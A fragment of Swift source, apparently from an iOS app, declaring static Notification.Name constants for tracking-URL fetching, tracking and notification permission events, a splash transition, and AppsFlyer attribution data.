    static let didFetchTrackingURL = Notification.Name("didFetchTrackingURL")
    static let checkTrackingPermission = Notification.Name("checkTrackingPermission")
    static let notificationPermissionResolved = Notification.Name("notificationPermissionResolved")
    static let splashTransition = Notification.Name("splashTransition")
    static let appsFlyerDataReceived = Notification.Name("appsFlyerDataReceived")
}

